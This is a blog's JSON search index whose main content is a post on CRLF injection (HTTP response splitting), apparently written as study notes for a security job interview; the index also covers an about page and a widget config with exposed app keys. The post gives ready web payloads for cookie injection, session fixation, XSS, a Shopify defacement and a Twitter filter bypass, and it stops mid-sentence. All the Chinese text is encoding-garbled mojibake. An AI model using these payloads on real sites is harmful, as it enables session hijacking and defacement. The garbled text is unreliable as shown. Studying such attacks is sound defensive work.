{"meta":{"title":"wolke","subtitle":"","description":"As the tree , so the fruit","author":"w01ke","url":"https://wolke.cn","root":"/"},"pages":[{"title":"å…³äºæˆ‘","date":"2022-11-08T11:44:03.866Z","updated":"2022-11-08T11:44:03.866Z","comments":true,"path":"about/index.html","permalink":"https://wolke.cn/about/index.html","excerpt":"","text":"ä¸€ã€å…³äºæˆ‘&emsp;&emsp;ä¿¡æ¯å®‰å…¨ä¸“ä¸šï¼Œä¸»è¦å­¦ä¹ æ¸ é“ä¸ºè‡ªå­¦ï¼Œæˆªè‡³2022å¹´11æœˆä»½ï¼Œè‡ªå­¦å®‰å…¨1å¹´åŠï¼ˆä¸€ç›´ä»¥ä¸ºè‡ªå·±æ˜¯20å¹´åˆå¼€å§‹å­¦çš„å®‰å…¨ç»ƒä¹ ä¸¤å¹´åŠï¼Œç»“æœçœ‹ä¹‹å‰çš„è®°å½•æ˜¯21å¹´åˆå¼€å§‹å­¦çš„å®‰å…¨ï¼‰ã€‚ &emsp;&emsp;ä¸€ä¸ªå®‰å…¨èœé¸¡ï¼Œå’Œå¾ˆå¤šå¸ˆå‚…è¿˜æœ‰å¾ˆå¤§çš„å·®è·ã€‚ &emsp;&emsp;å’Œå¾ˆå¤šå¸ˆå‚…ä¸€æ ·ï¼Œæˆ‘ä¹Ÿæœ‰ä¸€ä¸ªå®‰å…¨åœˆå­çš„IDâ€”â€”w01keï¼Œä¸ºä»€ä¹ˆå–åå«w01keï¼Œå…¶å®å¾ˆç®€å•ï¼Œå½“æ—¶ç”³è¯·çš„åŸŸåæ˜¯wolke.cnï¼Œäºæ˜¯ç¨å¾®ä¿®æ”¹äº†ä¸‹å°±å«w01keã€‚ &emsp;&emsp;ç½‘ç«™æ›´æ–°é¢‘ç‡ä¸å®šï¼Œæ—¶å¿«æ—¶æ…¢ï¼Œå¹³å¸¸ä¸»è¦ä½¿ç”¨è¯­é›€è¿›è¡Œå­¦ä¹ è®°å½•ï¼Œå¦‚æœæ‚¨æƒ³è·å–æ›´å¤šå­¦ä¹ æ–‡æ¡£ï¼Œå¯å…³æ³¨æˆ‘çš„è¯­é›€ï¼šhttps://www.yuque.com/xiaodingdang-mdzgm äºŒã€å…³äºåšå®¢&emsp;&emsp;æˆ‘ä¸ªäººå…¶å®ä¸æ€ä¹ˆçœ‹åŠ¨æ¼«ï¼Œä½†ç›®å‰ç½‘ç«™æ•´ä½“ç½‘ç«™æ˜¯åå¯çˆ±çš„äºŒæ¬¡å…ƒé£æ ¼ï¼Œå› ä¸ºè¿™çš„ç¡®è›®å¯çˆ±çš„ğŸ˜„ã€‚åé¢å¯èƒ½ä¼šè€ƒè™‘æ¢ä¸€ç§é£æ ¼ï¼Œæˆ‘æ·±çŸ¥ç›®å‰åšå®¢å¾ˆå¤šå°é¢ã€èƒŒæ™¯çš„é€‰å›¾ä¸å¤ªå¥½çœ‹ï¼Œå¦‚æœæ‚¨æœ‰æ›´å¥½çš„å»ºè®®ï¼Œå¯ä»¥è”ç³»æˆ‘ï¼Œè”ç³»æ–¹å¼ç›¸ä¿¡æ‚¨åº”è¯¥å¯ä»¥åœ¨ç½‘ç«™ä¸­å‘ç°ã€‚ &emsp;&emsp;ç½‘ç«™è‡ª2021å¹´è‡ªè¿è¥ç»´æŠ¤ï¼Œä¸»è¦ä½¿ç”¨ç»„ä»¶ï¼šhexoï¼ˆbutterflyä¸»é¢˜ï¼‰æŒ‚è½½githubï¼ŒCloudfareï¼ŒVercelï¼ŒLeanCloudéƒ¨ç½²Valine+Artitalkã€‚ &emsp;&emsp;å¦‚æœå‡ºç°å›¾ç‰‡/è¡¨æƒ…/å¤´åƒåŠ è½½ä¸å‡ºæ¥çš„æƒ…å†µï¼Œå¯ä»¥å°è¯•åˆ·æ–°å‡ æ¬¡ï¼Œå¦‚æœè¿˜æ˜¯åŠ è½½ä¸å‡ºæ¥ï¼Œåº”è¯¥æ˜¯apiçš„é—®é¢˜ï¼Œéƒ¨åˆ†è¡¨æƒ…å’Œå¤´åƒæ²¡æœ‰åŠæ—¶æ›´æ¢ï¼Œä¾ç„¶ä½¿ç”¨çš„æ˜¯å›½å¤–çš„ï¼Œå› æ­¤å›½å†…å¦‚æœä¸ä½¿ç”¨ä¸€äº›æ‰‹æ®µæ˜¯æ— æ³•åŠ è½½å›½å¤–åª’ä½“èµ„æºçš„ï¼Œç›®å‰è¿˜åœ¨é€æ¸æ›¿æ¢ã€‚ &emsp;&emsp;é™¤äº†åœ¨æŠ€æœ¯æ–‡ç« ä¸Šè¿›è¡Œè¾“å‡ºï¼Œæˆ‘ä¹Ÿä¼šå¼€å¯ä¸€ä¸ªç”Ÿæ´»å‘çš„æ–‡ç« é¢‘é“ï¼Œåˆ†äº«ä¸€äº›æœˆåº¦æ€»ç»“æ€§çš„æ–‡ç« ï¼Œå†…å®¹ä¸»è¦æ˜¯è¿‘æœŸåŠ¨æ€å’Œæ€»ç»“ä»¥åŠå¯¹æœªæ¥çš„ä¸€äº›æ‰“ç®—ï¼Œåšç¬¬ä¸€æœŸæ—¶åŸæœ¬æ‰“ç®—æ˜¯ä¿©æœˆä¸€æ›´ï¼Œç°åœ¨å¯èƒ½ä¸»è¦è¿˜æ˜¯çœ‹æ—¶é—´æ˜¯å¦å……è£•ï¼Œæœ‰å¯èƒ½ä¼šå››ä¸ªæœˆå†™ä¸€æœŸã€‚å¼€å¯è¿™ä¸ªé¢‘é“æœ‰å‡ æ–¹é¢è€ƒè™‘ï¼šâ‘  è®°å½•ã€‚è®°å½•è‡ªå·±å­¦ä¹ ç½‘ç»œå®‰å…¨è·¯ä¸Šçš„ä¸€ç‚¹ä¸€æ»´ï¼Œåˆæˆ–è€…æ˜¯è®°å½•è‡ªå·±ç”Ÿæ´»çš„ä¸€ç‚¹ä¸€æ»´ï¼›â‘¡ é”»ç‚¼æ€ç»´ã€‚å¼€å¯è¿™ä¸ªé¢‘é“ä¹‹åï¼Œå‘ç°å†™ç‚¹è‡ªå·±ç”Ÿæ´»ä¸Šçš„äº‹æƒ…ï¼Œä¸€æ–¹é¢å¯ä»¥è®©è‡ªå·±çœ‹äº‹æƒ…çš„è§’åº¦æ›´å¤šæ ·ï¼Œå¦ä¸€æ–¹é¢æ˜¯å¯ä»¥é”»ç‚¼è‡ªå·±é€»è¾‘èƒ½åŠ›ã€‚å†™ä½œé€»è¾‘ä¸è¯´è¯é€»è¾‘äº’é€šï¼Œæœ‰åŠ©äºæ—¥å¸¸äº¤é™…ï¼Œåˆæˆ–è€…æ˜¯é¢è¯•ã€å‘è¨€ç­‰é‡è¦åœºåˆï¼›"},{"title":"æ—¶é—´è½´","date":"2022-01-03T09:46:01.000Z","updated":"2022-01-03T10:22:54.756Z","comments":true,"path":"archives/index.html","permalink":"https://wolke.cn/archives/index.html","excerpt":"","text":""},{"title":"è¯´è¯´","date":"2021-12-06T13:05:12.000Z","updated":"2022-01-03T09:20:58.996Z","comments":true,"path":"artitalk/index.html","permalink":"https://wolke.cn/artitalk/index.html","excerpt":"","text":"new Artitalk({ appId: 'LBQq0RYOHPgeY9IIaQ60q6as-gzGzoHsz', appKey: 'pGTWd68pHbqIOVKgJFpQlwoo', serverURL: 'https://qn.wolke.cn', lang: 'zh', pageSize: 5, shuoPla: \"æ¥è¯´ç‚¹ä»€ä¹ˆå§ï¼\", motion: 1, atComment: 1, bgImg: \"https://gitee.com/cungudafa/source/raw/master/img/gif/Sitich/Sitich16.gif\", })"},{"title":"åˆ†ç±»","date":"2022-01-03T09:43:27.294Z","updated":"2022-01-03T09:43:27.294Z","comments":true,"path":"categories/index.html","permalink":"https://wolke.cn/categories/index.html","excerpt":"","text":""},{"title":"å‹é“¾","date":"2022-01-03T09:53:52.091Z","updated":"2022-01-03T09:53:52.091Z","comments":true,"path":"link/index.html","permalink":"https://wolke.cn/link/index.html","excerpt":"","text":""},{"title":"ç”µå½±","date":"2022-01-03T09:49:50.995Z","updated":"2022-01-03T09:49:50.995Z","comments":true,"path":"movies/index.html","permalink":"https://wolke.cn/movies/index.html","excerpt":"","text":""},{"title":"ç•™è¨€æ¿","date":"2022-01-03T01:19:45.000Z","updated":"2022-01-03T09:37:40.237Z","comments":true,"path":"messageboard/index.html","permalink":"https://wolke.cn/messageboard/index.html","excerpt":"","text":""},{"title":"æ ‡ç­¾","date":"2022-01-03T09:48:49.311Z","updated":"2022-01-03T09:48:49.311Z","comments":true,"path":"tags/index.html","permalink":"https://wolke.cn/tags/index.html","excerpt":"","text":""},{"title":"éŸ³ä¹","date":"2021-12-05T17:39:17.000Z","updated":"2022-11-08T08:10:15.363Z","comments":true,"path":"music/index.html","permalink":"https://wolke.cn/music/index.html","excerpt":"","text":"å±å¹•å·¦ä¸‹è§’æœ‰ä¸€ä¸ªéŸ³ä¹æ’­æ”¾å™¨å–”ï¼Œå¯æŸ¥çœ‹æ­Œå•å†…å®¹ï¼Œé€‰æ‹©æ’­æ”¾é¡ºåºï¼ˆé»˜è®¤éšæœºæ’­æ”¾ï¼Œå¯é€‰æ‹©é¡ºåºæ’­æ”¾ã€å•æ›²å¾ªç¯ï¼‰ã€éŸ³é‡ã€‚ ä¸»è¦éŸ³æºâ€”â€” from ç½‘æ˜“äº‘ Emoç±»ï¼šå›½è¯­ã€ç²¤è¯­ã€å¤–è¯­ å¥èº«ç±»ï¼šRemixã€DJã€ç”µå­éŸ³ä¹ ä¿çš®é˜³å…‰ç±»ï¼šå›½è¯­ã€å¤–è¯­"}],"posts":[{"title":"CRLFæ³¨å…¥ï¼ˆHTTPå“åº”æ‹†åˆ†/æˆªæ–­ï¼‰","slug":"CRLFæ³¨å…¥ï¼ˆHTTPå“åº”æ‹†åˆ†-æˆªæ–­ï¼‰","date":"2023-03-27T12:16:21.000Z","updated":"2023-03-27T12:31:45.426Z","comments":true,"path":"post/60a54be8.html","link":"","permalink":"https://wolke.cn/post/60a54be8.html","excerpt":"","text":"å‰è¨€2023å¹´HWå‚å•†æ–—è±¡é¢è¯•é¢˜â€”â€”CRLFæ³¨å…¥ ä¸€ã€æ¼æ´æè¿°HTTPæŠ¥æ–‡ä¸­ï¼Œ HTTP headerä¹‹é—´æ˜¯ç”±ä¸€ä¸ªCRLFå­—ç¬¦åºåˆ—åˆ†éš”å¼€çš„ï¼ŒHTTP Headerä¸Bodyæ˜¯ç”¨ä¸¤ä¸ªCRLFåˆ†éš”çš„ï¼Œæµè§ˆå™¨æ ¹æ®è¿™ä¸¤ä¸ªCRLFæ¥å–å‡ºHTTPå†…å®¹å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚ CRLFæ³¨å…¥æ¼æ´ï¼Œæ˜¯å› ä¸ºWebåº”ç”¨æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥åšä¸¥æ ¼éªŒè¯ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¾“å…¥ä¸€äº›æ¶æ„å­—ç¬¦ã€‚æ”»å‡»è€…ä¸€æ—¦å‘è¯·æ±‚è¡Œæˆ–é¦–éƒ¨ä¸­çš„å­—æ®µæ³¨å…¥æ¶æ„çš„CRLFï¼Œå°±èƒ½æ³¨å…¥ä¸€äº›é¦–éƒ¨å­—æ®µæˆ–æŠ¥æ–‡ä¸»ä½“ï¼Œå¹¶åœ¨å“åº”ä¸­è¾“å‡ºï¼Œæ‰€ä»¥åˆç§°ä¸ºHTTPå“åº”æ‹†åˆ†æ¼æ´ï¼ˆHTTP Response Splittingï¼‰ã€‚ æ‰€ä»¥å¦‚æœç”¨æˆ·çš„è¾“å…¥åœ¨HTTPè¿”å›åŒ…çš„Headerå¤„å›æ˜¾ï¼Œä¾¿å¯ä»¥é€šè¿‡CRLFæ¥æå‰ç»“æŸå“åº”å¤´ï¼Œåœ¨å“åº”å†…å®¹å¤„æ³¨å…¥æ”»å‡»è„šæœ¬ã€‚å› æ­¤CRLF Injectionåˆå«HTTPå“åº”æ‹†åˆ†/æˆªæ–­ï¼ˆHTTP Response Splittingï¼‰ç®€ç§°HRSã€‚ äºŒã€æ¼æ´çŸ¥è¯†æ‹“å±•CRLFæŒ‡çš„æ˜¯å›è½¦ç¬¦(CRï¼ŒASCII 13ï¼Œ\\rï¼Œ%0d) å’Œæ¢è¡Œç¬¦(LFï¼ŒASCII 10ï¼Œ\\nï¼Œ%0a)ã€‚ CRLFçš„æ¦‚å¿µæºè‡ªæ‰“å­—æœºï¼Œè¡¨æ˜è¡Œçš„ç»“æŸï¼Œè®¡ç®—æœºå‡ºç°åæ²¿ç”¨äº†è¿™ä¸ªæ¦‚å¿µã€‚ å›è½¦ç¬¦ï¼šå…‰æ ‡ç§»åˆ°è¡Œé¦–ï¼Œæ¢è¡Œç¬¦ï¼šå…‰æ ‡å‚ç›´ç§»åˆ°ä¸‹è¡Œã€‚ é”®ç›˜ä¸Šçš„å›è½¦é”®(Enter)å°±å¯ä»¥æ‰§è¡Œè¯¥æ“ä½œã€‚ä½†æ˜¯ä¸åŒçš„æ“ä½œç³»ç»Ÿï¼Œè¡Œçš„ç»“æŸç¬¦æ˜¯ä¸ä¸€æ ·çš„ Windowsï¼šä½¿ç”¨CRLFè¡¨ç¤ºè¡Œçš„ç»“æŸLinux/Unixï¼šä½¿ç”¨LFè¡¨ç¤ºè¡Œçš„ç»“æŸMacOSï¼šæ—©æœŸä½¿ç”¨CRè¡¨ç¤ºï¼Œç°åœ¨å¥½åƒä¹Ÿç”¨LFè¡¨ç¤ºè¡Œçš„ç»“æŸ æ‰€ä»¥åŒä¸€æ–‡ä»¶åœ¨ä¸åŒæ“ä½œç³»ç»Ÿä¸­æ‰“å¼€ï¼Œå†…å®¹æ ¼å¼å¯èƒ½ä¼šå‡ºç°å·®å¼‚ï¼Œè¿™æ˜¯è¡Œç»“æŸç¬¦ä¸ä¸€è‡´å¯¼è‡´çš„ã€‚ ä¸‰ã€æ¼æ´æ£€æµ‹CRLFæ³¨å…¥æ¼æ´çš„æœ¬è´¨å’ŒXSSæœ‰ç‚¹ç›¸ä¼¼ï¼Œæ”»å‡»è€…å°†æ¶æ„æ•°æ®å‘é€ç»™æ˜“å—æ”»å‡»çš„Webåº”ç”¨ç¨‹åºï¼ŒWebåº”ç”¨ç¨‹åºå°†æ¶æ„æ•°æ®è¾“å‡ºåœ¨HTTPå“åº”å¤´ä¸­ã€‚ï¼ˆXSSä¸€èˆ¬è¾“å‡ºåœ¨ä¸»ä½“ä¸­ï¼‰ æ‰€ä»¥CRLFæ³¨å…¥æ¼æ´çš„æ£€æµ‹ä¹Ÿå’ŒXSSæ¼æ´çš„æ£€æµ‹å·®ä¸å¤šã€‚é€šè¿‡ä¿®æ”¹HTTPå‚æ•°æˆ–URLï¼Œæ³¨å…¥æ¶æ„çš„CRLFï¼ŒæŸ¥çœ‹æ„é€ çš„æ¶æ„æ•°æ®æ˜¯å¦åœ¨å“åº”å¤´ä¸­è¾“å‡ºã€‚ 1ã€æ‰¾åˆ°æ³¨å…¥ç‚¹ï¼Œæ„é€ æ¶æ„çš„CRLFå­—ç¬¦æ­£å¸¸è¯·æ±‚ http://wolke.cn/index.php?url=http://baidu.com æŠ“åŒ…ï¼Œåœ¨è¯·æ±‚è¡Œçš„urlå‚æ•°ä¸­åŠ å…¥ç‰¹æ®Šæ„é€ çš„CRLFå­—ç¬¦ GET /index.php?url=http://baidu.com%0d%0aSet-Cookie:crlf=true HTTP/1.1Host: wolke.cnCookie: _ga=GA1.1.1945309492.1638725693; _ga_Q0YHC68NHX=GS1.1.1677577526.284.0.1677577526.0.0.0Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;111&quot;, &quot;Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;111&quot;Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: &quot;Windows&quot;Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close 2ã€æŸ¥çœ‹æ¶æ„æ•°æ®æ˜¯å¦åœ¨å“åº”å¤´ä¸­è¾“å‡ºå°†ä¿®æ”¹åçš„è¯·æ±‚åŒ…æäº¤ç»™æœåŠ¡å™¨ç«¯ï¼ŒæŸ¥çœ‹æœåŠ¡å™¨ç«¯çš„å“åº”ã€‚å‘ç°å“åº”é¦–éƒ¨ä¸­å¤šäº†ä¸ªSet-Cookieå­—æ®µã€‚è¿™å°±è¯å®äº†è¯¥ç³»ç»Ÿå­˜åœ¨CRLFæ³¨å…¥æ¼æ´ï¼Œå› ä¸ºæˆ‘ä»¬è¾“å…¥çš„æ¶æ„æ•°æ®ï¼Œä½œä¸ºå“åº”é¦–éƒ¨å­—æ®µè¿”å›ç»™äº†å®¢æˆ·ç«¯ã€‚ HTTP/1.1 302 FoundPragma: no-cacheLocation: http://baidu.comSet-Cookie: crlf=trueContent-Length: 0Connection: closeContent-Type: text/html å¾ˆå¤šäººçœ‹åˆ°è¿™é‡Œå¯èƒ½å°±æƒ³ä¸æ˜ç™½ï¼Œæˆ‘è¯·æ±‚åŒ…å†™å…¥çš„æ¶æ„æ•°æ®ï¼Œæ€ä¹ˆå°±è¢«å½“æˆå“åº”é¦–éƒ¨å­—æ®µè¾“å‡ºäº†ï¼Ÿä¸‹é¢æˆ‘ä»¬æ¥çœ‹çœ‹æœåŠ¡å™¨ç«¯æºä»£ç  if(isset($_GET[&quot;url&quot;]) &amp;&amp; ($_COOKIE[&quot;security_level&quot;]) != &quot;1&quot; &amp;&amp; $_COOkIE[&quot;security_level&quot;] != &quot;2&quot;))&#123; // Debugging // echo &quot;Not santized: &quot; . $_GET[&quot;url&quot;]; header(&quot;Location: &quot; . $_GET[&quot;url&quot;]); exit;&#125; è¿™æ˜¯å…¶ä¸­ä¸€æ®µä»£ç ï¼Œç”¨PHPå†™çš„ï¼Œéœ€è¦å¤§å®¶æœ‰ä¸€å®šçš„è¯­è¨€åŸºç¡€ã€‚è¿™æ®µä»£ç çš„æ„æ€æ˜¯ï¼šå½“æ¡ä»¶æ»¡è¶³æ—¶ï¼Œå°†è¯·æ±‚åŒ…ä¸­çš„urlå‚æ•°å€¼æ‹¼æ¥åˆ°Locationå­—ç¬¦ä¸²ä¸­ï¼Œå¹¶è®¾ç½®æˆå“åº”å¤´å‘é€ç»™å®¢æˆ·ç«¯ã€‚ æ­¤æ—¶æœåŠ¡å™¨ç«¯æ¥æ”¶åˆ°çš„urlå‚æ•°å€¼æ˜¯æˆ‘ä»¬ä¿®æ”¹åçš„ï¼š http://baidu.com%0d%0aSet-Cookie:crlf=true åœ¨urlå‚æ•°å€¼æ‹¼æ¥åˆ°Locationå­—ç¬¦ä¸²ä¸­ï¼Œè®¾ç½®æˆå“åº”å¤´åï¼Œå“åº”åŒ…æ­¤æ—¶åº”è¯¥æ˜¯ä¸‹é¢è¿™æ ·çš„ï¼š HTTP/1.1 302 FoundPragma: no-cacheLocation: http://baidu.com%0d%0aSet-Cookie: crlf=trueContent-Length: 0Connection: closeContent-Type: text/html %0då’Œ%0aåˆ†åˆ«æ˜¯CRå’ŒLFçš„URLç¼–ç ã€‚å‰é¢æˆ‘ä»¬è®²åˆ°ï¼ŒHTTPè§„èŒƒä¸­ï¼Œè¡Œä»¥CRLFç»“æŸã€‚æ‰€ä»¥å½“æ£€æµ‹åˆ°%0d%0aåï¼Œå°±è®¤ä¸ºLocationé¦–éƒ¨å­—æ®µè¿™è¡Œç»“æŸäº†ï¼ŒSet-Cookieå°±ä¼šè¢«è®¤ä¸ºæ˜¯ä¸‹ä¸€è¡Œï¼Œå¦‚ä¸‹æ‰€ç¤º HTTP/1.1 302 FoundPragma: no-cacheLocation: http://baidu.comSet-Cookie: crlf=trueContent-Length: 0Connection: closeContent-Type: text/html è€Œæˆ‘ä»¬æ„é€ çš„Set-Cookieå­—ç¬¦åœ¨HTTPä¸­æ˜¯ä¸€ä¸ªè®¾ç½®Cookieçš„é¦–éƒ¨å­—æ®µï¼Œè¿™ä¸ªæ—¶å€™å°±ä¼šå°†crlf=trueè®¾ç½®æˆCookieã€‚ GET /index.php?url=http://baidu.com%0d%0aSet-Cookie:crlf=true HTTP/1.1Host: wolke.cnCookie: crlf=true; _ga=GA1.1.1945309492.1638725693; _ga_Q0YHC68NHX=GS1.1.1677577526.284.0.1677577526.0.0.0Sec-Ch-Ua: &quot;Google Chrome&quot;;v=&quot;111&quot;, &quot;Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;111&quot;Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: &quot;Windows&quot;Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close é‡æ–°è¯·æ±‚ï¼ŒæŠ“åŒ…ï¼Œå‘ç°Cookieä¸­å¤šäº†crlf=trueã€‚ æµ‹è¯•çš„ç”¨ä¾‹å¤§å®¶å¯èƒ½ä¼šè§‰å¾—è¿™æ¼æ´æ²¡ä»€ä¹ˆå±å®³æ€§ï¼Œä½†è¯•æƒ³ä¸€ä¸‹ï¼šåˆ©ç”¨æ¼æ´ï¼Œæ³¨å…¥ä¸€ä¸ªCRLFæ§åˆ¶ç”¨æˆ·çš„Cookieï¼Œæˆ–è€…æ³¨å…¥ä¸¤ä¸ªCRLFï¼Œæ§åˆ¶è¿”å›ç»™å®¢æˆ·ç«¯çš„ä¸»ä½“ï¼Œè¯¥æ¼æ´çš„å±å®³ä¸äºšäºXSSã€‚ å››ã€æ¼æ´å±å®³æ ¹æ®æ’å…¥çš„CRLFçš„ä¸ªæ•°ä¸åŒï¼Œå¯è®¾ç½®ä»»æ„çš„å“åº”å¤´ï¼Œæ§åˆ¶å“åº”æ­£æ–‡ä¸¤ä¸ªä¸»è¦çš„åˆ©ç”¨åŠæ³•ã€‚å…·ä½“çš„å±å®³è¡¨ç°åœ¨ï¼šä¼šè¯å›ºå®šã€XSSã€ç¼“å­˜ç—…æ¯’æ”»å‡»ã€æ—¥å¿—ä¼ªé€ ç­‰ç­‰ã€‚ 1ã€ä¼šè¯å›ºå®š(Session Fixation)é¦–å…ˆè¯´è¯´ä»€ä¹ˆæ˜¯ä¼šè¯å›ºå®šæ”»å‡»ï¼Œä¼šè¯å›ºå®šæ”»å‡»ï¼ˆsession fixation attackï¼‰æ˜¯åˆ©ç”¨åº”ç”¨ç³»ç»Ÿåœ¨æœåŠ¡å™¨çš„ä¼šè¯IDå›ºå®šä¸å˜æœºåˆ¶ï¼Œå€ŸåŠ©ä»–äººç”¨ç›¸åŒçš„ä¼šè¯IDè·å–è®¤è¯å’Œæˆæƒï¼Œç„¶ååˆ©ç”¨è¯¥ä¼šè¯IDåŠ«æŒä»–äººçš„ä¼šè¯ä»¥æˆåŠŸå†’å……ä»–äººï¼Œé€ æˆä¼šè¯å›ºå®šæ”»å‡»ã€‚ ä¼šè¯å›ºå®šä¹Ÿæ˜¯ä¼šè¯åŠ«æŒçš„ä¸€ç§ç±»å‹ã€‚ä¼šè¯åŠ«æŒæ˜¯æ”»å‡»è€…å·èµ°å—å®³è€…ä¸æœåŠ¡å™¨å»ºç«‹é“¾æ¥çš„ä¼šè¯ï¼Œè€Œä¼šè¯å›ºå®šæ˜¯æ”»å‡»è€…äº‹å…ˆå»ºç«‹ä¸€ä¸ªä¼šè¯ï¼Œç„¶åè¯±ä½¿å—å®³è€…ä½¿ç”¨æ­¤ä¼šè¯è¿›è¡Œç™»å½•ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚ ä¸€ä¸ªå¸¸è§çš„è·³è½¬å“åº”åŒ…ï¼š HTTP/1.1 302 Moved TemporarilyDate: Fri,26Jun 2018 17:00:05 GMTContent-type: text/htmlContet-Length: 155Connection: closeLocation: http://www.sinay.com.cn å½“æ”»å‡»è€…åˆ©ç”¨CRLFå­—ç¬¦å¯¹å“åº”å¤´ä¸­çš„Locationè¿›è¡Œå¦‚ä¸‹è¾“å…¥ï¼š %0d%0aSet-Cookie:JSPSESSID%3Dhackingsite åˆ™è¿”å›åŒ…ä¼šå˜æˆï¼š HTTP/1.1 302 Moved TemporarilyDate: Fri,26Jun 2018 17:00:05 GMTContent-type: text/htmlContet-Length: 155Connection: closeLocation: http://www.sinay.com.cnSet-Cookie: JSPSESSID=hackingsite æ”»å‡»è€…å°±å¯ä»¥ç»™è®¿é—®è€…è®¾ç½®ä¸€ä¸ªsessionï¼Œé€ æˆâ€œä¼šè¯å›ºå®šâ€ã€‚é€šè¿‡è¿™ç§æ”»å‡»æ–¹å¼å¯ä»¥å®ç°æ’å…¥ä»»æ„å“åº”Headerã€‚ 2ã€åå°„å‹XSSä¸Šè¿°æ¡ˆä¾‹ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥çš„æ˜¯ï¼š %0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt; åˆ™è¿”å›åŒ…ä¼šå˜ä¸ºï¼š HTTP/1.1 302 Moved TemporarilyDate: Fri,26Jun 2018 17:00:05 GMTContent-type: text/htmlContet-Length: 155Connection: closeLocation:&lt;img src=1 onerror=alert(/xss/)&gt; æµè§ˆå™¨ä¼šæ ¹æ®CRLFå°†httpåŒ…åˆ†ä¸ºheaderå’Œbodyï¼Œç„¶åå°†bodyä¸­çš„å†…å®¹æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°XSSã€‚ ä»ä¸Šé¢çš„æ¡ˆä¾‹ä¸­ï¼Œå¦‚æœé‡åˆ°XSSè¿‡æ»¤çš„æƒ…å†µæˆ‘ä»¬è¿˜å¯ä»¥åœ¨httpheaderä¸­æ³¨å…¥X-XSS-Protection: 0ï¼Œå¯ç»•è¿‡æµè§ˆå™¨çš„è¿‡æ»¤è§„åˆ™å®ç°XSSå¼¹çª—æ˜¾ç¤ºã€‚ äº”ã€å®æˆ˜æ¡ˆä¾‹è®²è§£1ã€Shopifyå“åº”æ‹†åˆ†shopifyä¼šåœ¨åå°ä¸­è®°å½•ç”¨æˆ·ä¸Šæ¬¡è®¿é—®çš„æ˜¯å“ªä¸€ä¸ªå•†åº—ï¼Œç„¶åå°†å…¶æ”¾ç½®åœ¨cookieï¼Œå¦‚è®¿é—®/last_shop?xxx.shopify.comï¼Œåˆ™è¿”å›set-cookie:xxx.shopify.comï¼Œæ‰€ä»¥è¾“å…¥ï¼š /last_shop?xxx.shopify.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a&lt;html&gt;deface&lt;/html&gt; æœ€ç»ˆè§£æçš„ç»“æœä¸ºï¼š Set-cookie: xxx.shopify.comContent-Length: 0HTTP/1.1 200 OKContent-Type:text/htmlContent-Length: 19&lt;html&gt;deface&lt;/html&gt; 2ã€Hackeroneå“åº”æ‹†åˆ†è¿™ä¸ªæ¡ˆä¾‹ä¹Ÿæ˜¯302è·³è½¬ç±»å‹ï¼Œä½†ç•¥æœ‰ä¸åŒï¼Œè®¿é—® info.hacker.one/%0d%0a%09headername:%20headervalue Locationæ­£å¸¸å–å€¼info.hacker.oneï¼Œå‰©ä¸‹çš„è§£æä¸ºHeaderå¤´ã€‚ 3ã€Twitterè¿‡æ¸¡ç»•è¿‡ç”¨æˆ·åœ¨è®¿é—®https://twitter.com/i/safety/report_story åœ°å€æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè·å–å‚æ•°reported_tweet_idçš„å€¼ï¼Œå¹¶å°†å…¶è®¾ç½®åˆ°cookieä¸­ï¼Œæœ€åå¯¼è‡´äº†æ¼æ´ã€‚ è¿™é‡ŒTwitterç¦æ­¢ç”¨æˆ·æäº¤æ¢è¡Œç¬¦0x0aï¼ˆ%0aï¼‰ï¼Œä½†é€šè¿‡æ¢æµ‹ï¼Œå‘ç°å…¶åç«¯æ£€æµ‹é€»è¾‘ä¸ºï¼šå¦‚æœæäº¤çš„æ•°æ®æ˜¯UTF-8ç¼–ç è¿‡çš„ï¼Œåˆ™ä¼šå°†å…¶è§£ç ï¼Œå»é™¤æ— ç”¨å­—ç¬¦åä½œä¸ºcookieè¾“å‡ºï¼Œæ‰€ä»¥å¦‚æœæäº¤%E5%98%8Aï¼Œä¸è¢«æ‹¦æˆªä¸”ç»Unicodeè§£ç åå˜ä¸ºU+560Aï¼Œæœ€åå–0Aï¼ŒåŒæ ·è¾“å…¥%E5%98%8Dæœ€åå˜æˆ0Dï¼Œæœ€ç»ˆpayloadä¸ºï¼š reported_tweet_id=%E5%98%8A%E5%98%8DSet-Cookieï¼š%20test æ¢æµ‹æ¼æ´å­˜åœ¨ï¼Œå¯è¿›ä¸€æ­¥è¿›è¡Œåˆ©ç”¨ï¼Œè¾“å…¥ï¼š 